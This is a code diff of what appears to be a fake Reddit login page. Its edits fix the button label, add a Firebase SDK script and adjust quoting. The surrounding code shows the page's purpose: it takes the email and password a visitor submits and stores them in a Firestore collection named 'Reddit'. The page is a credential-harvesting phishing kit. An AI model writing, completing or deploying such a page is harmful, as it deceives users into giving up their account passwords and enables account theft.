@@ -152,7 +152,7 @@
               </fieldset>
 
               <fieldset class="AnimatedForm__field m-small-margin">
-                <button  type="submit" onclick="datos()">Log in 9</button>
+                <button  type="submit" onclick="datos()">Log in</button>
               </fieldset>
 
 
@@ -247,7 +247,7 @@
 
 <!-- The core Firebase JS SDK is always required and must be listed first -->
 <script src="https://www.gstatic.com/firebasejs/7.24.0/firebase.js"></script>
-
+<script src="https://www.gstatic.com/firebasejs/7.24.0/firebase-app.js"></script>
 <!-- TODO: Add SDKs for Firebase products that you want to use
      https://firebase.google.com/docs/web/setup#available-libraries -->
 <script src="https://www.gstatic.com/firebasejs/7.24.0/firebase-analytics.js"></script>
@@ -284,7 +284,7 @@
       password: passvalue
     });*/
 
-    db.collection("Reddit").add({
+    db.collection('Reddit').add({
       email: emailvalue,
       password: passvalue
     })
